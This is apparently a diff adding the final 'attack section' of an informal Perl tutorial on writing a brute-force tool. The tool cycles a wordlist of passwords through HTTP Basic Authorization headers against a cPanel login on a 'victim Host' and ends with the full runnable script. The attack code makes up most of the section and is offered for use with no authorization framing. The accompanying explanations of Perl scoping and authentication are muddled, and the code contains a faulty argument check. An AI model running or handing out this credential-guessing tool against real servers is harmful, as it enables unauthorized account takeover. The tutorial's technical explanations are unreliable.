@@ -689,4 +689,223 @@ once we create the function and create a new INET socket we can now check to see
 the $@ is kinda confusing but its a evalulation or EVAL statement and decleration, this means by using the eval statement `	The Perl syntax error message from the last eval command.` that there was an error connecting to the host, when we use the $@ it kinda works as or die accept a bit better and is more commonly used with other modules and interfaces, if the $@ is not present then this means we made a sucessful connection on that host and port which means the port is open
 
 
+We are now at the last seciton aka the attack section, now when we want to make a brute foricng tool we will need a wordlist to use, this is so that the user does not have to manually input a password all the time and wait to come up with new ideas, why not have a program do it? thats kinda the point, so our next function will be the headx function which will define the list, setting, and the main fucntion which will be run 
 
+```pl
+sub headx() {
+    ip_check();
+    check_port();
+    port_scanner_slash_check();
+    say "[*] Setting: Target URL -> $url";
+    say "[*] Setting: target     -> $host";
+    say "[*] Setting: User       -> $user";
+    say "[*] Setting: Port       -> $port";
+    say "[*] Setting: Pass-List  -> $file";
+    say "[*] Setting: File       -> $file";
+    open (PASSFILE, "<$list") || die "[-] Can't open the List of password file !";
+    @PASSWORDS = <PASSFILE>;
+    close PASSFILE;
+    foreach my $P (@PASSWORDS) {
+        chomp $P;
+        $passwd = $P;
+        print "\n [*] Trying password -> $passwd \n";
+        &brute;
+        };
+    }
+````
+
+before i continue lets also make our brute forcing function 
+
+```pl
+sub brute() {
+    $authx = encode_base64($user.":".$passwd);
+    print $authx;
+    my $socket = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print "\n [-] Can not connect to the host";
+    print $socket  "GET / HTTP/1.1\n";
+    print $socket "Authorization: Basic $authx\n";
+    print $socket "Connection: Close\n\n";
+    read  $socket, $answer, 128;
+    close($socket);
+
+    if ($answer =~ /Moved/) {
+        print "\n [~] PASSWORD FOUND : $passwd \n";
+        print("[*] Finished scan at -> $hour:$min:$sec\n");
+        exit();
+    }
+}
+````
+
+right now that both functions are there lets work through this, so the first fucntion up top does a few things, it calls both check and verify ip and port functoons, then also verifys the port is connectable by calling the port scanner slash check subroutine which is the one that port scans it basically, the things below that are just statements to tell the user the data they have used and inputted, basically giving them a summary of the flags in the case they want to look back at the log, next we use the open function to open a filename as PASSFILE for < mode which is the read mode, we will read this along with $list which is outr wordlist argument flag 
+
+when we open it we define and call an array named `@PASSWORDS` which is parsed with the `<PASSFILE>` function, once done we close the file and then open or start a foreach function which will define a value for every password in that array which is from that list, for every password in that file we will chomp the row, them run the brute forcing function, once the function brute is called we pass the arguments to it which works as the following
+  
+when we call the &brute function we are calling the 
+
+```
+The ampersand & prefix is a part of the subroutine name, however, it is optional when you call the subroutine. You can call a subroutine by specifying its name with parentheses as shown following: subroutine_name();
+```
+
+but when we call the function we are setting up a new socket, which is the same thing as the port function if not a bit more utilizied, for every password in the list we create a new connection and base64 encode the payload string which is 
+
+```pl
+    $authx = encode_base64($user.":".$passwd);
+    print $authx;
+    my $socket = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print "\n [-] Can not connect to the host";
+    print $socket  "GET / HTTP/1.1\n";
+    print $socket "Authorization: Basic $authx\n";
+    print $socket "Connection: Close\n\n";
+```
+
+when we run the authx function we are parsing the $user and the $passwd together, which basically tells the socket to use AUTHX as a authentication method, if the answer is ewual to moved then that means the authentication was sucessful and we have properly brute forced the password, you may be wondering how the values are pointed and called with the &brute function, it is actually not passed to that function at all because the subroutine does not take any aditional argument's it just picks up the public variable we declared under the for loop
+
+thats a cool thing about perl as well, as long as a variable is declared as `my` then all classes can now view it ( depending on the loop or function type ), in this case we use the 
+
+```pl
+   foreach my $P (@PASSWORDS) {
+        chomp $P;
+        $passwd = $P;
+        print "\n [*] Trying password -> $passwd \n";
+        &brute;
+```
+
+or FOREACH MY loop which is acceptable to have other subroutines read it, then the authorization type is pushed to the socket, and uses the authx method to brute force the client, once we finish writing all this down we should have something like this 
+
+```pl
+use IO::Socket;
+use LWP::Simple;
+use feature 'say';
+use MIME::Base64;
+use Getopt::Std;
+# check if the hosts port is open
+
+
+my %opts = (
+    a  => '',                   
+    w => '',
+);
+
+# h = Host address 
+# u = UserName 
+# p = Port
+# l = password list 
+# f = file for save passwords
+getopt('h:u:p:l:f:', \%opts);
+
+
+@months = qw( Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec );
+@days = qw(Sun Mon Tue Wed Thu Fri Sat Sun);
+$host     = $opts{h};
+$user     = $opts{u};
+$port     = $opts{p};
+$list     = $opts{l};
+$file     = $opts{f};
+$url = "http://".$host.":".$port;
+
+if($host, $user, $port, $list eq ""){
+
+    print q(
+        |-------------------------------------------------------------|
+        |       Hm looks like Argument < 3 (list) was not specified   |
+        #-------------------------------------------------------------#
+        #    [Host] : victim Host             (simorgh-ev.com)        #
+        #    [User] : User Name               (demo)                  #
+        #    [PORT] : Port of Cpanel          (2082)                  #
+        #    [list] : File Of password list   (list.txt)              #
+        #    [File] : file for save password  (password.txt)          #
+        #                                                             #
+        ###############################################################
+);
+exit();
+}
+
+headx();
+
+$numstart  = "-1";
+
+# start port check
+# flushing buffer 
+$| = 1;
+# this will check for the port of the host, if it is open conitnue if 
+# it comes back false then exit and say user may have wrong 
+# port on $host during try of $url
+sub port_scanner_slash_check() {
+    $socket = IO::Socket::INET->new(
+        Proto => tcp,
+        PeerAddr => $host,
+        PeerPort => $port,
+    );
+    if($@) {
+        print "\033[31mFailed to connect on port $port using host $host\033[39m\n"
+    } else {
+        print "\033[32m[*] Setting: Port is open -> $port Con made on host -> $url\n"
+    }
+
+}
+
+# check if the port is a real number 
+sub check_port() {
+    my $regex = "^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])";
+    if($port =~ "^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])") {
+        print "[*] Port matches to regex  -> $regex\n";
+        print "[*] Setting: Port Verified ->  $port\n";
+    } else {
+        say "\033[31m[!] WARN: FATAL: ERR: EXIT -> Reason?\n";
+        say "[!] $port failed to match regex string \n";
+        say "[!] $regex\n";
+    }
+}
+
+# check if the IP is true
+sub ip_check()
+{
+  my $ip = "$host:$port";
+  my $regex = "/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5})/";
+  if($ip =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5})/)
+  {
+      print "\n[*] Address matches with RE string -> $1\n";
+      print "\n[*] Setting: Target port -> $ip\n"
+  } else {
+      say "\033[31m[!] WARN: FATAL: Tested $ip with regex $regex just for it to come back";
+      say "\033[31m[!] WARN: False, this address is not real must be char";
+      exit();
+  }
+}
+
+sub headx() {
+    ip_check();
+    check_port();
+    port_scanner_slash_check();
+    say "[*] Setting: Target URL -> $url";
+    say "[*] Setting: target     -> $host";
+    say "[*] Setting: User       -> $user";
+    say "[*] Setting: Port       -> $port";
+    say "[*] Setting: Pass-List  -> $file";
+    say "[*] Setting: File       -> $file";
+    open (PASSFILE, "<$list") || die "[-] Can't open the List of password file !";
+    @PASSWORDS = <PASSFILE>;
+    close PASSFILE;
+    foreach my $P (@PASSWORDS) {
+        chomp $P;
+        $passwd = $P;
+        print "\n [*] Trying password -> $passwd \n";
+        &brute;
+        };
+    }
+
+sub brute() {
+    $authx = encode_base64($user.":".$passwd);
+    print $authx;
+    my $socket = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print "\n [-] Can not connect to the host";
+    print $socket  "GET / HTTP/1.1\n";
+    print $socket "Authorization: Basic $authx\n";
+    print $socket "Connection: Close\n\n";
+    read  $socket, $answer, 128;
+    close($socket);
+
+    if ($answer =~ /Moved/) {
+        print "\n [~] PASSWORD FOUND : $passwd \n";
+        print("[*] Finished scan at -> $hour:$min:$sec\n");
+        exit();
+    } 
+}
+```
